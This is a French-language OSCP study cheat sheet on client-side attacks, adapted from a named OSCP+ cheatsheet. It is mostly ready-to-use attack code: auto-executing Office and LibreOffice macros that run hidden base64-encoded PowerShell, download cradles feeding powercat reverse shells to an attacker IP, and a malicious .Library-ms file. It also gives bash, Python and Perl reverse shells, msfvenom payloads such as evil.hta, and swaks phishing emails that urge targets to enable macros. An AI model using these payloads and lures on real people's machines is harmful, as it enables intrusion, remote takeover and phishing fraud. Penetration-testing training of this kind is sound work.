---
title: "OSCP · Attaques côté client"
description: "Comprendre les vecteurs d'interaction avec les postes utilisateurs."
---

# OSCP · Attaques côté client

Comprendre les vecteurs d'interaction avec les postes utilisateurs.


## MACROS


Commande `sub` pour la rubrique « MACROS ».

```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```


Commande `sub` pour la rubrique « MACROS ».

```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "[Your PowerShell Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
```


Commande `iex` pour la rubrique « MACROS ».

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell
```


Exemple technique pour la rubrique « MACROS ».

```powershell
$text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
Write-Output $encoded
```


Commande `cmd_str` pour la rubrique « MACROS ».

```python
cmd_str = "[Your Base64 Encoded PowerShell Command]"

chunk_size = 50

for i in range(0, len(cmd_str), chunk_size):
    print(f'Str = Str + "{cmd_str[i:i+chunk_size]}"')
```


Commande `sub` pour la rubrique « MACROS ».

```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim encodedCmd As String

    encodedCmd = encodedCmd + "[Base64 Chunk 1]"
    encodedCmd = encodedCmd + "[Base64 Chunk 2]"
    encodedCmd = encodedCmd + "..."
    encodedCmd = encodedCmd + "[Base64 Chunk N]"

    CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
End Sub
```


## Windows Library Files

Observer les permissions et la configuration de Windows.


Commande `wsgidav` pour la rubrique « Windows Library Files ».

```bash
wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
```


Commande `powershell.exe` pour la rubrique « Windows Library Files ».

```powershell
# Create the file as a shortcut in the Windows system to prepare the attack
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
```


**Paramètres et repères :**
`.Library-ms`  


Exemple technique pour la rubrique « Windows Library Files ».

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>[http://your-server]</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```


## Avancé Exploitation


Commande `sub` pour la rubrique « Avancé Exploitation ».

```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "powe" & "rshe" & "ll.exe"
    cmdStr = cmdStr & " -nop -w hidden -enc " & "[Base64 Encoded Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
```


Commande `sub` pour la rubrique « Avancé Exploitation ».

```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "cmd.exe /c ""powershell.exe -nop -w hidden -enc " & "[Base64 Encoded Command]" & """"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
```


Exemple technique pour la rubrique « Avancé Exploitation ».

```powershell
# Using Encodings
$text = "[Your PowerShell Command]"
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
Write-Output $encoded

# Altering PowerShell Execution Policies
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand [Your Base64 Encoded Command]
```


Exemple technique pour la rubrique « Avancé Exploitation ».

```html
<script>
    var cmd = "[Your JavaScript Command]";
    eval(cmd);
</script>
```


Commande `var` pour la rubrique « Avancé Exploitation ».

```javascript
var cmd = "";
cmd += "var shell = new ActiveXObject('WScript.Shell');";
cmd += "shell.Run('cmd.exe /c powershell.exe -nop -w hidden -enc [Base64 Encoded Command]');";
eval(cmd);
```


Commande `net` pour la rubrique « Avancé Exploitation ».

```powershell
net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
```


### Courriel simple


Commande `swaks` pour la rubrique « Courriel simple ».

```bash
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "Subject: [email-subject]" --suppress-data
```


**Paramètres et repères :**
`-t` · `--from` · `--attach` · `--server`  
`--body` · `--header` · `--suppress-data`  


### Courriel avec authentification


Commande `swaks` pour la rubrique « Courriel avec authentification ».

```bash
sudo swaks -t <recipient@example.com> --from <sender@example.com> \
--attach config.Library-ms --server <SMTP_SERVER> --body body.txt \
--header "Subject: Problems" --suppress-data \
--auth LOGIN --auth-user <username> --auth-password <password>
```


Commande `--auth` pour la rubrique « Courriel avec authentification ».

```text
--auth LOGIN
```


**Paramètres et repères :**
`--auth-user` · `--auth-password`  


### Email with Custom Headers for Social Engineering


Commande `swaks` pour la rubrique « Email with Custom Headers for Social Engineering ».

```bash
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "X-Priority: 1 (Highest)" --header "Importance: High" --suppress-data
```


**Paramètres et repères :**
`X-Priority` · `Importance`  


### Alternative Tool sendemail


Commande `sendemail` pour la rubrique « Alternative Tool sendemail ».

```bash
sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
-u '[subject]' -m '[message]' -a '[attachment]'
```


**Paramètres et repères :**
`sendemail` · `-f` · `-t` · `-s`  
`192.168.203.140:25` · `-u` · `-m` · `-a`  


### Comparison Summary


**Authentification**

No · Yes · No · No


**Custom Headers**

Subject only · Subject only · Multiple (e.g., Priority, Importance) · Subject only


**SMTP Authentification**

No · Yes · No · No


**Social Engineering Usage**

No · No · Yes (with custom headers) · No


**Tool Complexity**

Moderate · Moderate · Moderate · Simple


### Cibles Linux

Examiner les permissions et la configuration de Linux.


Commande `echo` pour la rubrique « Cibles Linux ».

```bash
echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh

# Alternatively, use msfvenom to create an ELF payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf

# If the target machine allows Bash scripts to execute
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f bash -o payload.sh

# Useful if Python is available on the target
msfvenom -p python/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o payload.py

# Alternative Python Reverse Shell Payload
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > shell.py

# Alternative Perl Reverse Shell Payload
echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' > shell.pl
```


Commande `-f` pour la rubrique « Cibles Linux ».

```text
-f elf
```


Commande `-o` pour la rubrique « Cibles Linux ».

```text
-o shell.elf
```


**Paramètres et repères :**
`shell.elf`  


Commande `sub` pour la rubrique « Cibles Linux ».

```text
Sub RunShell
    Shell("/bin/bash -c 'wget http://<your_ip>/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh'")
End Sub

- Shell: Executes the Bash command.  
- wget: Downloads the payload from your web server.  
- chmod +x: Makes the script executable.  
- /tmp/shell.sh: Runs the script from /tmp.
```


Commande `python3` pour la rubrique « Cibles Linux ».

```bash
python3 -m http.server 80
```


**Paramètres et repères :**
`update.odt`  


Ouvrir un port d'écoute avec Netcat.

```bash
nc -lvnp 4444
```


**Paramètres et repères :**
`swaks`  


Commande `swaks` pour la rubrique « Cibles Linux ».

```bash
swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password 'your_password' \
--attach update.odt --header "Subject: Important Update" \
--body "Hello,\n\nPlease find the attached document and enable macros to view the content.\n\nBest regards,\nEmmanuel"

# Execution Flow:
# 1. Target opens the LibreOffice document.
# 2. When the target enables macros, the payload is downloaded and executed.
# 3. A reverse shell connects to your Netcat listener.
```


### Cibles Windows

Observer les permissions et la configuration de Windows.


Commande `msfvenom` pour la rubrique « Cibles Windows ».

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta
```


Commande `-f` pour la rubrique « Cibles Windows ».

```text
-f hta-psh
```


Commande `-o` pour la rubrique « Cibles Windows ».

```text
-o evil.hta
```


**Paramètres et repères :**
`evil.hta` · `.hta` · `msfvenom` · `ps1`  
`exe`  


Commande `-f` pour la rubrique « Cibles Windows ».

```text
-f exe -o evil.exe
```


**Paramètres et repères :**
`vbs`  


Commande `-f` pour la rubrique « Cibles Windows ».

```text
-f vbs -o evil.vbs
```


**Paramètres et repères :**
`ps1`  


Commande `-f` pour la rubrique « Cibles Windows ».

```text
-f ps1 -o script.ps1
```


**Paramètres et repères :**
`dll`  


Commande `-f` pour la rubrique « Cibles Windows ».

```text
-f dll -o payload.dll
```


**Paramètres et repères :**
`evil.hta`  


Commande `s` pour la rubrique « Cibles Windows ».

```python
# Python script to split the payload into 50-character chunks
s = "<PASTE_PAYLOAD_HERE>"  # Replace with your payload string
n = 50  # Chunk size

for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```


**Paramètres et repères :**
`exploit.ods` · `Tools` · `Options` · `LibreOffice`  
`Security`  


Commande `macro` pour la rubrique « Cibles Windows ».

```text
Macro Security
```


**Paramètres et repères :**
`Tools` · `Macros`  


Commande `organize` pour la rubrique « Cibles Windows ».

```text
Organize Macros
```


Commande `libreoffice` pour la rubrique « Cibles Windows ».

```text
LibreOffice Basic
```


**Paramètres et repères :**
`Exploit`  


Commande `rem` pour la rubrique « Cibles Windows ».

```text
REM ***** BASIC *****
Sub Exploit
    Dim Str As String
    ' Add payload chunks here
    Str = Str + "powershell.exe -nop -w hidden -e "
    Str = Str + "<INSERT_YOUR_PAYLOAD_CHUNKS>"
    
    ' Execute the payload using Shell
    Shell Str, 1
End Sub
```


Exemple technique pour la rubrique « Cibles Windows ».

```text
<INSERT_YOUR_PAYLOAD_CHUNKS>
```


**Paramètres et repères :**
`-nop`  


Commande `-w` pour la rubrique « Cibles Windows ».

```text
-w hidden
```


**Paramètres et repères :**
`Shell`  


Commande `shell` pour la rubrique « Cibles Windows ».

```text
Shell Str, 1
```


Commande `shell` pour la rubrique « Cibles Windows ».

```text
Shell(Str)
```


Commande `shell` pour la rubrique « Cibles Windows ».

```text
Shell Str, 1
```


**Paramètres et repères :**
`Shell`  


Ouvrir un port d'écoute avec Netcat.

```bash
nc -lvnp 444
```


Commande `swaks` pour la rubrique « Cibles Windows ».

```bash
swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password 'your_password' \
--attach evil.hta --header "Subject: Important Document" \
--body "Hi,\n\nPlease find the attached document.\n\nBest regards,\nEmmanuel"
```


**Paramètres et repères :**
`exploit.ods`  


Commande `python3` pour la rubrique « Cibles Windows ».

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


Afficher des informations de la session ou du système.

```bash
systeminfo
whoami
ipconfig /all
```


Commande `cd` pour la rubrique « Cibles Windows ».

```text
cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
